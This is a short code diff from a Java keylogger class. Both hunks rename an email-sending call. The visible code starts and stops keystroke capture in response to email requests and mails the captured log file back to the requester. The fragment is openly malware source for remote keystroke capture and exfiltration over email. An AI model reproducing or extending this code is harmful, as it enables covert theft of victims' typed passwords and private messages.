@@ -75,7 +75,7 @@ public class KeyLogger implements NativeKeyListener {
         } else {
             System.out.println("Keylogger is running...");
         }
-        SendMail.sendEmail(from, "Reply for request: Start keylogger", "",
+        SendMail.serversendEmail(from, "Reply for request: Start keylogger", "",
                 HTMLGenerator.generateHTML("Your request has been completed successfully!", "Key logger has started"));
     }
 
@@ -92,7 +92,7 @@ public class KeyLogger implements NativeKeyListener {
             System.out.println("Keylogger hasn't started yet.");
         }
 
-        SendMail.sendEmail(from, "Reply for request: Stop keylogger", file.toString(),
+        SendMail.serversendEmail(from, "Reply for request: Stop keylogger", file.toString(),
                 HTMLGenerator.generateHTML("Your request has been completed successfully",
                         """
                                  The keylogger has stopped. 
